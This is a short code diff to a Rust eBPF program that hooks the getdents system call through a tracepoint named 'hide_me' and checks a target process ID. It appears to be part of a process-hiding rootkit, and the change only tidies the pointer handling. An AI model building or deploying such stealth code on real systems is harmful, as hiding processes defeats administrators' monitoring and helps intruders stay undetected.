@@ -36,12 +36,15 @@ pub fn hide_me(ctx: TracePointContext) -> u32 {
 }
 
 fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
-    let the_target_ppid = unsafe { target_ppid.get(&0).unwrap() as *const i32 };
-    let pid_tgid = bpf_get_current_pid_tgid();
+    let the_target_ppid = unsafe { target_ppid.get(&0) };
 
-    if the_target_ppid.is_null() {
+    if the_target_ppid.is_none() {
         return Err(0);
     }
+
+    let the_target_ppid = the_target_ppid.unwrap();
+
+    let pid_tgid = bpf_get_current_pid_tgid();
 
     if unsafe { *the_target_ppid } != 0 {
         let ppid = unsafe {
